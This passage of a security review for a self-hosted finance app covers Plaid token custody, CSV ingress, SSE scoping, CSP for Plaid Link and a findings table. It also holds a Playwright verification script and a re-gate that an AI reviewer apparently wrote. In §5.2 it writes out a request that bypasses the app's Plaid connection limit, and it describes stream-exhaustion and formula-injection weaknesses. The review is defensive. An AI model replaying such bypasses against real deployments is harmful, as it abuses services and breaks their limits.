 Test Files  21 passed (21)
      Tests  426 passed (426)

$ vitest run --project api-db
 Test Files  8 passed | 1 skipped (9)
      Tests  85 passed | 1 skipped (86)
```

511 green tests with the ownership predicate deleted from a background writer's
feed. Every suite in the repo seeds exactly one user, so none of them can
distinguish "scoped to the caller" from "scoped to nothing". D6 puts `user_id`
on every table from migration one precisely so multi-user is additive later;
scoping that is only ever exercised against one user is scoping nobody has
tested.

**Closed** by `packages/contexts/ledger/test/gate-user-scope.test.ts`: one
database, two users, symmetric rows, five tests over `listTransactions`,
`listForCategorization`, `getTransaction`, `setRuleCategory` and
`setTransactionOverlay`. Verified load-bearing — under the same sabotage:

```
 FAIL  |ledger-db| test/gate-user-scope.test.ts > ledger user scoping > listForCategorization cannot be handed another user's transaction ids
AssertionError: expected [ …(2) ] to deeply equal [ Array(1) ]
      Tests  1 failed | 4 passed (5)
```

---

## 5. Threat model of what Phase 1 added (Standard D)

### 5.1 External data ingress — Plaid responses and CSV files as untrusted input

Phase 1 is the first phase where bytes chosen by someone other than Chris enter
the ledger. Two paths: a Plaid `/transactions/sync` response, and a file posted
to `/imports/csv`.

**Handled well, and verified:**

- **The ledger never trusts provider identity.** `applyProviderTransactions`
  keys on `(user_id, provider, provider_transaction_id)` and provider facts are
  immutable (D11) — a provider restating a row creates a revision, it does not
  mutate history, and the user overlay survives (sabotage L1 in wp1.7, re-checked
  here via S11a/S11b).
- **Numbers are `BIGINT` minor units end to end** (D3). There is no float path
  from a Plaid `amount` to a balance, so a hostile value cannot produce a
  rounding artefact — it can only produce a wrong number that is visibly wrong.
- **No `eval`, no template execution, no dynamic `import()` on provider data.**
  Confirmed by reading `packages/connectors/plaid/src/map.ts` and the CSV
  parsers.
- **The CSV parser is in-house and total** — `readCsv` handles quotes, embedded
  delimiters and CRLF, and refuses a multi-character delimiter rather than
  mis-splitting. No `hyperformula` or similar (D15 deny-list).
- **Upload bounds are real:** JSON body under Fastify's `bodyLimit: 1_048_576`,
  `files` `.min(1).max(20)`, `name` `.max(255)` and never used as a path. No
  archive handling, so no zip-slip; no filename-derived filesystem write, so no
  path traversal. The CSRF hook rejects an over-limit body before parsing
  (measured: 2 MiB → `403`, not an OOM).

**Findings:**

- **R-2 (HIGH, fixed)** — CSV export formula injection. §4.4. This is the one
  place Phase 1 took untrusted provider text and wrote it into a format another
  program _executes_.
- **R-4 (MEDIUM)** — `merchantId` resolves from any non-blank descriptor
  (wp1.7 §7 item 5, raised there as a design question). The security-relevant
  reading: merchant identity is derived from attacker-influenced text, and
  merchant identity is a _filter key_ on `GET /transactions` and will become a
  grouping key for insights in Phase 2. A provider (or a crafted CSV) that emits
  many near-identical descriptors can inflate the merchant table and split or
  merge spend groupings. Not exploitable for data disclosure; it is a data-quality
  and resource-growth issue that gets worse when Phase 2 hangs rules and
  budgets off merchant identity. Recommend deciding it before Phase 2, not after.
- **R-5 (LOW)** — no bound on distinct merchants or on `transactions_provider`
  revisions per transaction. A misbehaving provider that restates the same row
  on every 4-hourly poll grows `revision` and the fact table without limit. Worth
  a counter and an alert rather than a cap.

### 5.2 Token custody lifecycle: link → seal → open → sync → disconnect → `/item/remove`

Traced end to end, in code and against the database.

| Stage      | Where the token is                                                                         | Verified                                                                                                                                                                                                                              |
| ---------- | ------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Link       | Plaid Link (browser) → `publicToken` in a request body                                     | Never logged (S2, S7); body not persisted                                                                                                                                                                                             |
| Exchange   | `PlaidConnector.connect` → `credentials` object, in memory                                 | `access_token` "returned in `credentials` and **not kept**" on the connector                                                                                                                                                          |
| Seal       | `SecretBox.sealText` with AAD `(connections, sealed_credentials, rowId)`                   | S1: plaintext storage turns the raw-column test red at two layers                                                                                                                                                                     |
| At rest    | `connections.sealed_credentials`, XChaCha20-Poly1305                                       | Raw column read as `psql` would; AAD binds to the row — a ciphertext moved between rows fails `decrypt_failed` (existing test, non-vacuous)                                                                                           |
| Open       | `openHandle` returns a **closure** (`handle.secret('access_token')`), not a field          | `JSON.stringify(handle)` does not contain the token (existing test)                                                                                                                                                                   |
| In flight  | Plaid SDK headers `PLAID-SECRET` / `PLAID-CLIENT-ID`                                       | `SENSITIVE_KEYS` censors at any depth; error envelopes (`config`/`request`/`response`) dropped wholesale — the axios shape that carries `config.data` as an already-serialised JSON string is handled by dropping, not by key-walking |
| Disconnect | `disconnectConnection` sets `sealed_credentials = NULL` after a best-effort `/item/remove` | Local destruction always happens; existing test                                                                                                                                                                                       |

**Findings:**

- **R-6 (MEDIUM) — what survives a disconnect, in the backup.** Disconnect nulls
  the column, which is correct. But `docker/backup/backup.sh` takes a nightly
  `pg_dump` retained **30 days locally** and pushed to B2 with object lock (D24),
  so a sealed credential lives in up to thirty immutable copies after the user
  disconnects. This is _not_ a plaintext exposure — the dump is `age`-encrypted
  and the credential is itself sealed under the KEK — so it is defence in depth,
  not a breach. It matters because D5's scope rule ("key loss = re-link
  providers") assumes the KEK is the only thing standing between a backup and a
  provider token, and because a user who disconnects reasonably believes the
  credential is gone. **Recommendation:** say so in `RUNBOOK.md` under
  "Disconnect", and treat KEK rotation as the operation that actually retires
  old credentials. No code change.
- **R-7 (MEDIUM) — the ten-Item ratchet is bypassable and is scoped per user.**
  `POST /connections/plaid/exchange` counts Plaid connections and refuses an
  eleventh (S4, red first try). But `POST /connections` links _any registered
  provider_, Plaid included, with no such check:

  ```
  POST /connections  { "provider": "plaid", "input": { "publicToken": "…" } }
  ```

  reaches `linkConnection` → `createConnection` → a real Item, with the ratchet
  never consulted. `POST /connections/{id}/complete` has the same shape (its
  `expectConnectionId` guard rejects a _different_ connection, but the Item has
  been exchanged at Plaid by then). Separately, the count is
  `listConnectionSummaries(database, session.userId)` — **per user**, while
  Plaid's cap is per `client_id`, i.e. per deployment. Single-user today (D6),
  so the second half is latent; the first half is live. R5 in the master plan's
  risk register is "Plaid 10-Item ratchet burned by experimentation", and this is
  exactly the hole through which it gets burned. **Fix:** move the check into
  `linkConnection` (or into `createConnection` for `provider === 'plaid'`) and
  count across all users. ~10 lines, but it is in a file adjacent to the routing
  work of C-1 and belongs with it, so it is condition C-3 rather than a gate fix.

- **R-8 (LOW)** — `POST /connections/plaid/link-token` needs only a session, and
  the route comment argues that convincingly (an ephemeral token addressed to
  this user, useless without the step-up-guarded `exchange`). Agreed. Recording
  it so the asymmetry is a decision on file rather than an oversight.

### 5.3 The SSE channel

`GET /sync/stream` and `GET /connections/{id}/events` read the outbox directly.

- **Session required** — S12, red first try.
- **User-scoped in the query**, not in the handler: `eq(domainEvents.userId,
options.userId)` is a `WHERE` clause on every read, and
  `/connections/{id}/events` adds `aggregate_id` on top. A stream opened against
  another user's connection id therefore yields _nothing_ rather than their
  events, with no existence oracle (the empty stream is identical either way).
- **Payloads are ids, counts and enums by registry rule** — `frameOf` serialises
  the domain event payload verbatim, which is safe only because of that rule.
  Worth noting as a standing constraint: the first consumer that puts a
  descriptor or an amount in an event payload puts it on this wire.
- `Last-Event-ID` / `?from=` accept only `/^\d{1,19}$/`, and an unparseable value
  is ignored rather than 400'd. No injection surface; `BigInt` overflow bounded
  by the 19-digit cap.
- One dedicated pool connection per stream, released in `finally`. The existing
  "does not leak a connection when a stream is opened and dropped repeatedly"
  test is real (it went red as collateral under S12).

**Finding — R-9 (LOW):** there is no per-user cap on concurrent streams. Each
holds a Postgres connection out of `DATABASE_POOL_MAX` (10 in production), so
ten browser tabs exhaust the pool and the API stops serving everything else. A
stolen session cookie is enough. **Recommendation:** cap concurrent streams per
session (or serve all streams off one shared listener), and raise it against
`DATABASE_POOL_MAX`.

### 5.4 The outbox / categorization consumer

The one background writer that takes row ids from a message.

- **R-3 (HIGH)** — its feed's user scope had no test at all. §4.5. Closed.
- The consumer passes `event.userId` (the outbox row's own column, written under
  the same transaction as the fact) rather than anything from the payload, which
  is the right choice: the trusted identity comes from the row, not the message
  body.
- `decide()` short-circuits on a user override before any tier competes (S11b/G2),
  and `setRuleCategory` never writes `user_category_id` (S11a). So a hostile
  merchant descriptor can influence the _rule/provider_ tiers and can never
  overwrite what the user said.
- `listForCategorization` feeds the **unmerged** user value, so a rule's own
  answer cannot masquerade as a user edit on the next pass. Verified by reading;
  pinned by the existing `rule-category` suite.

### 5.5 The web client

- **CSP is intact and strict** — and that is exactly why Plaid Link does not work
  (F-3, proven in the browser). The policy has no `'unsafe-inline'` for scripts,
  no nonce theatre (Phase 0 removed a placeholder nonce that browsers discarded),
  `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`.
- **SRI on `cdn.plaid.com` is not achievable**, and this should be recorded as an
  accepted risk rather than a to-do. `apps/web/src/lib/plaid-link.ts` loads
  `link/v2/stable/link-initialize.js` — a deliberately _moving_ alias that Plaid
  updates to ship security fixes, and which Plaid's own documentation requires
  you not to pin. An `integrity` attribute would break the app on Plaid's next
  release. The residual risk is real and structural: **a compromise of
  `cdn.plaid.com` executes arbitrary script in the origin that holds the
  session cookie.** Compensating controls available today: the cookie is
  `__Host-`/`HttpOnly` so script cannot read it; every dangerous mutation needs a
  fresh WebAuthn assertion (which a script _could_ trigger, but not forge
  silently); and the CSP addition should be the narrowest that works.
- **Recommended CSP for C-2**, narrowest that makes Link function:

  ```
  script-src 'self' https://cdn.plaid.com;
  frame-src  https://cdn.plaid.com;
  connect-src 'self' https://cdn.plaid.com https://sandbox.plaid.com https://production.plaid.com;
  ```

  and **only when Plaid is configured** — a deployment with no Plaid secrets
  should keep `'self'`. `Cross-Origin-Embedder-Policy: require-corp` must also be
  reckoned with: it will block the cross-origin script and iframe unless Plaid
  serves compatible CORP/COEP headers. Verify empirically with the §7 probe,
  which reports `loaded` / `blocked` and prints the exact violated directive —
  do not assume.

- `iconKey` on the connector manifest is an asset key and the route asserts it is
  never a URL, so the server cannot tell the browser to fetch something arbitrary
  (existing test). Good.
- The WP 1.6 Playwright walkthrough runs against a **mocked API on the Vite dev
  server**, never against the real API through Caddy (`apps/web/playwright.config.ts`,
  `e2e/support/mock-api.ts`). That is a defensible scope choice for a UI work
  package, and it is also precisely why F-4 survived: the mock answers
  `/connections` with JSON, and the real proxy answers it with HTML.

### 5.6 The two Phase 0 Lows carried into Phase 1

- **R-9 (Phase 0) — unmatched `/assets/*` returned `200 text/html`.** **Closed
  and verified.** The Caddyfile now splits static prefixes into their own
  `handle` with a plain `file_server` (real 404) and restricts the SPA rewrite to
  extensionless, non-file paths. Re-read at HEAD and confirmed on the running
  proxy.
  _However_, the same class of defect reappeared one level up as **F-4**: an
  unmatched **API** path returns `200 text/html`. The Phase 0 fix addressed the
  symptom for assets; the underlying rule — "a path this server does not
  actually serve must not answer 200 with the app shell" — is still violated for
  every Phase 1 API prefix.
- **R-13 (Phase 0) — cold `up` lands `backup` unhealthy.** **Closed**, verified
  on a genuinely cold start with no pre-existing volumes. §2.4.

---

## 6. Verdict and conditions

### GO-WITH-CONDITIONS

**What is genuinely good, and should be said plainly.** The Phase 1 _domain_
work is the strongest in this repo. Sixteen of eighteen sabotages went red on the
first try against tests somebody else wrote, several with exact, meaningful
assertions rather than incidental crashes — cursor atomicity produced
`expected '10' to be null`, the tier order failed at both the unit and the
database layer, log hygiene failed six ways. The credential custody chain is
correct from link to disconnect, including AAD binding and closure-not-field
handles. The user-scoping is real everywhere the gate could test it with a second
account holder. The conformance suite, the non-leaky categorization gates and the
orchestrator invariants are all load-bearing. This is not a phase that was
tested badly.

**Why it is not a clean GO.** Everything above is true of the _code_. None of it
was true of the _deployment_. The api image had not booted since WP 1.2; the
proxy routes three of eleven API prefixes; Plaid has no secrets mounted and is
CSP-blocked in the browser. Phase 1's own exit criteria — "two real institutions
syncing on schedule", "a forced reauth completes without data loss" — are not
merely unproven, they are unreachable in the deployed system. The release-ladder
rung this phase is meant to reach, v0.2 "the trust gate", cannot be evaluated
against a stack in which no connection can be made.

The recurring mechanism is worth naming because it is now three for three: a
control is made computed on the half somebody was looking at and left hardcoded
on the half they were not (api image keep/delete), or derived from the artifact
it is supposed to be checking (the CSP e2e reads the Caddyfile), or written as a
doc comment with no test (the `plaid_*` env ban). Each was found the same way:
by running the thing rather than reading about it.

### Conditions

| #        | Condition                                                                                                                                                                                                                                                                                                                                                                                                                    | Severity     | Owner                          |
| -------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------ | ------------------------------ |
| **C-1a** | **Give the API its own routed namespace.** `handle_path /api/*` in `docker/Caddyfile`, `servers: [{url:'/api'}]` in the OpenAPI document, regenerated web client, service-worker rules and `e2e/support/mock-api.ts` updated to match. Prefix routing alone cannot work: `/transactions` and `/accounts` are both SPA routes and API routes.                                                                                 | **CRITICAL** | backend + frontend, one change |
| **C-1b** | **A CI check that the proxy's routed prefixes equal the contract's.** Parse `openapi.json`, assert `docker/Caddyfile` proxies exactly that set. This is the control whose absence let F-4 ship; without it C-1a rots the next time a router is added.                                                                                                                                                                        | **CRITICAL** | devops                         |
| **C-1c** | **Run `apps/api/test/gate-image-closure.test.ts` in CI's image-build job**, after the build. The Dockerfile fix is applied and proven (it fails against a deliberately rebuilt broken image), but nothing yet runs it where the image exists.                                                                                                                                                                                | **HIGH**     | devops                         |
| **C-2**  | **Widen the CSP for Plaid, narrowly, and only when Plaid is configured** — §5.5 for the exact directives — then re-run the §7 probe and confirm it reports `loaded`, including under `Cross-Origin-Embedder-Policy: require-corp`. Record the absence of SRI on `cdn.plaid.com` as an accepted risk with its reasoning.                                                                                                      | **HIGH**     | security + devops              |
| **C-3**  | **Mount the three `plaid_*` secrets in `compose.yml`** (declare them, add to `api` and `worker`), document them in `RUNBOOK.md` "Create secrets" and `.env.example`, set `PLAID_REDIRECT_URI` for OAuth institutions — **and close the ratchet bypass** (R-7): enforce the ten-Item check inside `linkConnection`, counted across all users, not only in the `exchange` route.                                               | **HIGH**     | devops + backend               |
| **C-4**  | **Re-walk the Phase 1 user path** after C-1..C-3: Manual account, CSV import, transactions list, edit a category and a note, accounts and balances, connections, and a real Plaid Sandbox Link through the browser. Confirm the worker runs a **scheduled** sync end to end. This gate got as far as a real passkey login and no further, and the remaining steps are exactly the ones that exercise the code Phase 1 added. | **HIGH**     | whoever lands C-1              |
| **C-5**  | Decide R-4 (broad `merchantId` resolution) **before Phase 2** hangs rules and budgets off merchant identity.                                                                                                                                                                                                                                                                                                                 | MEDIUM       | architecture                   |
| **C-6**  | Document in `RUNBOOK.md` that a disconnected provider's sealed credential persists in retained backups for the retention window, and that KEK rotation is what retires it (R-6). Cap concurrent SSE streams per session against `DATABASE_POOL_MAX` (R-9).                                                                                                                                                                   | MEDIUM/LOW   | docs + backend                 |

**Not conditions, carried forward as open items** (unchanged from wp1.7 §7, and
not fixable by more testing): two real institutions syncing on schedule, a forced
reauth completed against live Plaid, and "zero internal transfers on a month of
**real** data" all need Chris's own accounts linked. The seed-based proofs that
stand in for them are sound and non-vacuous; they are just not about real data.
Verifying the CI-parity fix in a real GitHub Actions run also remains open —
this gate could not push.

### Findings summary

| ID  | Severity     | Finding                                                                                   | State                                |
| --- | ------------ | ----------------------------------------------------------------------------------------- | ------------------------------------ |
| F-1 | **CRITICAL** | api image prunes `packages/connectors`; has not booted since WP 1.2                       | **Fixed in place** + regression test |
| F-4 | **CRITICAL** | Caddy routes 3 of 11 API prefixes; every Phase 1 route returns `200` SPA HTML, silently   | Reported (C-1)                       |
| F-2 | HIGH         | `plaid_*` secrets never mounted in compose; Plaid connector unregistered in production    | Reported (C-3)                       |
| F-3 | HIGH         | Production CSP blocks Plaid Link (script, frame, connect) — proven in browser             | Reported (C-2)                       |
| R-1 | HIGH         | "`plaid_*` never readable from env" had no test; 67/67 green with an env fallback added   | **Test added**                       |
| R-2 | HIGH         | CSV export formula injection (CWE-1236) from provider-controlled payee names              | **Fixed in place** + test            |
| R-3 | HIGH         | Categorization feed's user scope had no test; 511 green with the predicate deleted        | **Test added**                       |
| R-7 | MEDIUM       | Ten-Item ratchet bypassable via `POST /connections`; counted per user, not per deployment | Reported (C-3)                       |
| R-4 | MEDIUM       | `merchantId` resolves from any non-blank descriptor                                       | Reported (C-5)                       |
| R-6 | MEDIUM       | Sealed credentials persist in retained backups after disconnect                           | Reported (C-6)                       |
| R-5 | LOW          | No bound on merchant growth or provider-fact revisions                                    | Reported                             |
| R-8 | LOW          | `link-token` needs only a session (reviewed, agreed, recorded)                            | Accepted                             |
| R-9 | LOW          | No per-user cap on concurrent SSE streams vs `DATABASE_POOL_MAX`                          | Reported (C-6)                       |
| —   | closed       | Phase 0 R-9 (assets 404) and R-13 (backup cold start)                                     | **Both verified closed**             |

---

## 7. Reproduction

Tree state when this gate finished: `git status` shows the Dockerfile fix, the
transactions.ts fix, four new `gate-*` test files and this evidence directory,
and nothing else. Every sabotage was restored with `git checkout --`.

```
 M apps/api/src/routes/transactions.ts        # R-2 fix (csvText)
 M docker/api.Dockerfile                      # F-1 fix (computed delete set)
?? apps/api/test/db/gate-phase1.test.ts       # step-up side effects, cross-user, CWE-1236
?? apps/api/test/gate-image-closure.test.ts   # F-1 regression
?? packages/config/src/gate-secret-custody.test.ts   # R-1
?? packages/contexts/ledger/test/gate-user-scope.test.ts  # R-3
?? docs/evidence/phase-1/gate-security-review.md
?? docs/evidence/phase-1/screenshots/
```

Whole-tree suite after the gate's changes:

```
$ DATABASE_URL=… pnpm exec vitest run --reporter=dot
 Test Files  92 passed | 1 skipped (93)
      Tests  1467 passed | 2 skipped (1469)
```

(1443 baseline + 24 new gate tests.) `pnpm run typecheck` and `pnpm run lint`
both clean; schema-ownership 94 tables across 14 packages.

### The browser-walk script

Run from `apps/web` (so `@playwright/test` resolves), with the stack up:

```bash
just up
just bootstrap-user name="Gate Reviewer"     # copy the one-time token
docker compose cp proxy:/data/caddy/pki/authorities/local/root.crt /tmp/gate-ca.crt
SPKI=$(openssl s_client -connect 127.0.0.1:443 -servername personalfi.lan </dev/null 2>/dev/null \
  | openssl x509 -pubkey -noout | openssl pkey -pubin -outform der \
  | openssl dgst -sha256 -binary | openssl enc -base64)
cd apps/web && SPKI_PIN="$SPKI" BOOTSTRAP_TOKEN="<token>" node gate-walk.mjs
```

<details><summary><code>gate-walk.mjs</code> (verbatim)</summary>

```js
// SPDX-License-Identifier: MIT
// Phase 1 security gate — the real browser walk, against the real production
// compose stack through Caddy's internal CA. No mocks, no dev server.
import { chromium } from '@playwright/test';
import { mkdirSync } from 'node:fs';

const BASE = 'https://personalfi.lan';
const SHOTS = '/home/chris/Projects/PersonalFi/docs/evidence/phase-1/screenshots';
const TOKEN = process.env.BOOTSTRAP_TOKEN;
if (!TOKEN) throw new Error('set BOOTSTRAP_TOKEN');
mkdirSync(SHOTS, { recursive: true });

const log = [];
const note = (m) => {
  log.push(m);
  console.log(m);
};

const browser = await chromium.launch({
  args: [
    '--host-resolver-rules=MAP personalfi.lan 127.0.0.1',
    // Trust EXACTLY this leaf, by SPKI hash — not `ignoreHTTPSErrors`, which
    // would trust anything and prove nothing about Caddy's internal CA.
    `--ignore-certificate-errors-spki-list=${process.env.SPKI_PIN}`,
  ],
});
const context = await browser.newContext({ ignoreHTTPSErrors: false });
const page = await context.newPage();

const violations = [];
const consoleErrors = [];
const apiCalls = [];
page.on('response', async (r) => {
  const u = new URL(r.url());
  if (!/^\/(auth|connections|transactions|accounts|connectors|imports|sync)/.test(u.pathname))
    return;
  let body = '';
  try {
    body = (await r.text()).slice(0, 220);
  } catch {
    body = '<unreadable>';
  }
  apiCalls.push(`${r.request().method()} ${u.pathname} -> ${r.status()} ${body}`);
});
page.on('pageerror', (e) => consoleErrors.push(`pageerror: ${e.message}`));
page.on('console', (m) => {
  if (m.type() === 'error') consoleErrors.push(m.text());
});

await page.addInitScript(() => {
  window.__cspViolations = [];
  document.addEventListener('securitypolicyviolation', (e) => {
    window.__cspViolations.push(`${e.violatedDirective} :: ${e.blockedURI}`);
  });
});

// A REAL virtual authenticator, not a navigator.credentials override.
const cdp = await context.newCDPSession(page);
await cdp.send('WebAuthn.enable');
const { authenticatorId } = await cdp.send('WebAuthn.addVirtualAuthenticator', {
  options: {
    protocol: 'ctap2',
    transport: 'internal',
    hasResidentKey: true,
    hasUserVerification: true,
    isUserVerified: true,
    automaticPresenceSimulation: true,
    // Without these two, Chrome's create() succeeds but the assertion that
    // follows is refused and the app reports "That was cancelled."
    defaultBackupEligibility: true,
    defaultBackupState: true,
  },
});
note(`virtual authenticator ${authenticatorId} attached via CDP`);

const shot = async (n) => {
  await page.screenshot({ path: `${SHOTS}/gate-${n}.png`, fullPage: true });
};
const collectCsp = async () => {
  const v = await page.evaluate(() => window.__cspViolations ?? []).catch(() => []);
  for (const i of v) if (!violations.includes(i)) violations.push(i);
};
const bodyText = async () =>
  (await page.locator('body').innerText()).replace(/\s+/g, ' ').slice(0, 400);

note('STEP 1: open the one-time enrolment link');
await page.goto(`${BASE}/register#token=${TOKEN}`, { waitUntil: 'networkidle' });
await shot('01-register');
await collectCsp();
const enrol = page.getByRole('button', { name: /enrol|enroll|passkey|register|create/i }).first();
if (await enrol.count()) {
  await enrol.click();
  await page.waitForTimeout(3000);
}
await shot('02-after-enrol');
await collectCsp();
note(`  page says: ${await bodyText()}`);
await shot('03-post-enrol');

note('STEP 2: sign in');
await page.goto(`${BASE}/`, { waitUntil: 'networkidle' });
await page.waitForTimeout(1500);
note(`  url=${page.url()}`);
const signIn = page.getByRole('button', { name: /sign in|log in|unlock|passkey/i }).first();
if (await signIn.count()) {
  await signIn.click();
  await page.waitForTimeout(3000);
}
await shot('04-signed-in');
await collectCsp();
note(`  page says: ${await bodyText()}`);

for (const [name, path] of [
  ['05-transactions', '/transactions'],
  ['06-accounts', '/accounts'],
  ['07-connections', '/accounts/connections'],
]) {
  await page.goto(`${BASE}${path}`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(1500);
  note(`STEP ${path}: ${await bodyText()}`);
  await shot(name);
  await collectCsp();
}

note('STEP: does the Plaid CDN script load under the production CSP?');
const probe = await page.evaluate(
  () =>
    new Promise((resolve) => {
      const s = document.createElement('script');
      s.src = 'https://cdn.plaid.com/link/v2/stable/link-initialize.js';
      s.async = true;
      s.onload = () => resolve('loaded');
      s.onerror = () => resolve('blocked');
      document.head.appendChild(s);
      setTimeout(() => resolve('timeout'), 8000);
    }),
);
note(`  cdn.plaid.com script: ${probe}`);
await collectCsp();
await shot('08-plaid-probe');

note('API CALLS:');
for (const c of apiCalls) note(`  ${c}`);
note('CSP VIOLATIONS:');
for (const v of violations) note(`  ${v}`);
note('CONSOLE ERRORS:');
for (const e of consoleErrors.slice(0, 25)) note(`  ${e}`);
await browser.close();
```

</details>

Screenshots are in `docs/evidence/phase-1/screenshots/gate-*.png`.

### Teardown

`docker compose down` after the walk; the gate left no running containers and no
scratch databases (every `*-db` suite drops its own).

### One note on hygiene

`just bootstrap-user` prints the enrolment token twice — once inside the URL and
once on a `token only:` line. Both were kept out of this file and out of every
command transcript in it (redacted at the shell with `sed` before any output was
read). The token used for the walk was single-use and has been consumed. The
Phase 0 evidence-hygiene test exists because a live token once reached an
evidence document; it did not this time.

---

## 8. Re-gate (C-4)

**Reviewer:** Opus re-gate, independent of the Phase 1 work packages, of the
first gate, and of both remediation agents. This reviewer built nothing and
remediated nothing.
**Tree:** `/home/chris/Projects/PersonalFi`, branch `main`, HEAD `a438ec8`
(`just verify` green at `1961d9e` + two api fixes covered by `just check` at
`a438ec8`, per the remediation docs).
**Date:** 2026-09-15.

Written incrementally, so a rate-limit kill loses only the section in progress.
The standing instruction is unchanged from §0: do not trust a control that has
never been observed failing, and do not trust a green evidence doc written by
the agent that wrote the code. Every red below was produced by this reviewer,
in this tree, not read out of `gate-remediation-web.md` or
`gate-remediation-api.md`.

### 8.1 Independent re-verification

```
$ DATABASE_URL=postgres://personalfi:personalfi@127.0.0.1:5433/personalfi_dev just verify

check-proxy-routes: PASS — docker/Caddyfile routes exactly '/api/*' to the api,
  matching packages/contracts/openapi/openapi.json's servers[0].url ('/api') and
  covering all 11 contract prefix(es): /accounts, /auth, /connections, /connectors,
  /health, /imports, /net-worth, /ready, /sync, /transactions, /transfers.

 Test Files  95 passed | 1 skipped (96)
      Tests  1481 passed | 2 skipped (1483)      # root vitest
 Test Files  14 passed (14)
      Tests  80 passed (80)                      # apps/web

=== verify: playwright (smoke + csp) ===         9 passed (29.7s)
=== verify: gitleaks (full history) ===          (clean)
=== verify: license gate + THIRD_PARTY.md drift ===   license gate: PASS
=== verify: compose hardening ===                SELF-TEST PASS (19/19 hostile rules fire)
```

Counts match `gate-remediation-api.md` §1 exactly (1481/2 skipped, 80). The one
skipped file / two skipped tests are `connector-plaid`'s live-Sandbox smoke,
self-skipping with no `PLAID_CLIENT_ID`/`PLAID_SECRET` in the shell — the same
baseline the first gate recorded.

That run exited **1**, at `compose-hardening-check`, for a reason that is this
reviewer's own doing and is also a real (small) finding — see **N-2** below. A
clean re-run with the override removed is in §8.6.

### 8.2 Two new findings from bringing the stack up (before any sabotage)

Both were found the way every decisive finding in this repo has been found: by
running the documented procedure rather than reading about it.

#### N-1 (MEDIUM) — `just harden-secrets` does not know about the three `plaid_*` secrets, and a hardened deployment will not boot

`RUNBOOK.md` "Create secrets" step 6 tells the operator to write the Plaid
credentials into the three files and says they are "mode 0400 via `just
harden-secrets`, same as every other secret here." They are not:

```
$ sed -n '702,725p' justfile | grep -c plaid
0
```

`harden-secrets` chowns `database_url` and `master_key` to `10001`,
`pg_password` to `70:10002`, and `age_recipient`/`b2_*` to `10002`. The three
`plaid_*` secrets that C-3 added and mounted on `api` and `worker` (both uid 10001) are in none of those lists. The recipe's **keep** set is a hand-written
literal while `SECRET_SPECS` in `packages/config/src/schema.ts` is the computed
one — the identical asymmetry that produced F-1 (image prune keep/delete) and
F-4 (Caddyfile prefixes vs contract prefixes). Third occurrence, third
mechanism-identical cause.

Observed, on the secrets exactly as they sat on this host (`0400 chris:chris`,
which is what an operator who read that sentence and ran `chmod 400` gets):

```
$ docker compose up -d
 Container personalfi-api-1  Error dependency api failed to start
dependency failed to start: container personalfi-api-1 is unhealthy

$ docker compose logs api | tail
api-1 | configuration is invalid; 3 problem(s) found:
api-1 |   - secret:plaid_client_id: could not be read (EACCES)
api-1 |       fix: check permissions on /run/secrets/plaid_client_id; it should be mode 0400 owned by the app user
api-1 |   - secret:plaid_secret: could not be read (EACCES)
api-1 |   - secret:plaid_env: could not be read (EACCES)

$ docker compose logs worker | tail   # identical three problems
```

**Both `api` and `worker` crash-loop.** Not Plaid — the _whole deployment_: an
optional connector's unreadable secret is a hard boot failure, because
`loadConfig` correctly treats `EACCES` as a problem rather than as "absent"
(only `ENOENT`/`ENOTDIR` mean absent). That fail-closed choice is right; what
is wrong is that the documented hardening step produces exactly that state.

Severity is MEDIUM rather than HIGH because the failure is loud, immediate, and
carries the exact fix in its own message — it cannot ship silently the way F-2
did. It is still a first-install blocker for anyone who hardens their secrets
and uses Plaid.

**Cleared to proceed** by applying step 6's own code block (`chmod 0444`, which
is what the RUNBOOK actually _runs_, contradicting its prose), after which:

```
api-1 | {"level":"info","service":"api","provider":"plaid","environment":"sandbox",
        "msg":"plaid configured; connector registered"}
api-1 | {"...,"secretsPresent":["database_url","master_key","plaid_client_id",
        "plaid_secret","plaid_env"],"PLAID_ALLOW_PRODUCTION":false,...}
```

The three files' original modes are restored at teardown (§8.6). Proposed fix
and its test are in **§8.5**.

#### N-2 (LOW) — an active `compose.override.yml` makes `just verify` fail

`compose.override.example.yml` (lines 54–72) documents `compose.override.yml`
as the way to turn `PLAID_ENABLED` on for `proxy`/`api`/`worker` without
editing `.env`. Creating exactly that file — three services, one env var each —
breaks the security gate that runs over compose files:

```
$ just verify
compose-hardening-check: FAIL: compose.override.yml: 'docker compose config' rejected this file:
    service "proxy" has neither an image nor a build context specified: invalid compose project
compose-hardening-check: FAIL — one or more compose files violate the P0-6/P0-7 baseline
error: recipe `verify` failed
```

`scripts/compose-hardening-check.sh` renders each `compose*.yml` **in
isolation**, and an override fragment is by construction not a standalone
project. `compose.override.example.yml` itself passes only because every one of
its services is commented out ("template with no active services"). So the
check passes on the template and fails on every real use of the mechanism the
template exists to teach.

It fails closed and loudly, so it is LOW: nothing insecure ships. The cost is
that an operator following the documented Plaid-enablement path can no longer
run `just verify`, and the obvious way out is to stop running it. Fix: render
overrides layered on `compose.yml` (`docker compose -f compose.yml -f
compose.override.yml config`) rather than alone, or skip `compose.override.yml`
by name the way the example file is already special-cased.

This re-gate switched to the `.env` mechanism (`PLAID_ENABLED=true`, also
documented, and what `compose.yml`'s `${PLAID_ENABLED:-false}` actually reads)
and deleted the override, which is why §8.6's re-run is clean.

### 8.3 The browser walk (C-4)

Same construction as §7, re-run from scratch against the **production compose
stack rebuilt from HEAD** (`docker compose build`, all four images), with Plaid
enabled:

- **the real internal-CA certificate, pinned by SPKI hash.** Chromium launched
  with `--ignore-certificate-errors-spki-list=<sha256 of Caddy's leaf SPKI>` and
  `ignoreHTTPSErrors: false`. The chain was separately checked with
  `curl --cacert` on the root Caddy generated:
  `ssl_verify_result=0 http=200`.
- **a real CDP virtual authenticator** (`WebAuthn.addVirtualAuthenticator`,
  ctap2/internal, resident key, user verification) — not the page-level
  `navigator.credentials` override the repo's own e2e suite uses. The credential
  enrolled in stage 1 is exported with `WebAuthn.getCredentials` and re-attached
  with `WebAuthn.addCredential` in each later stage, so **every stage runs a
  real WebAuthn ceremony**, including the step-up assertions that gate
  connection mutations.
- `--host-resolver-rules=MAP personalfi.lan 127.0.0.1`.
- no route interception, no mocks, no dev server. The full script is in §8.7.

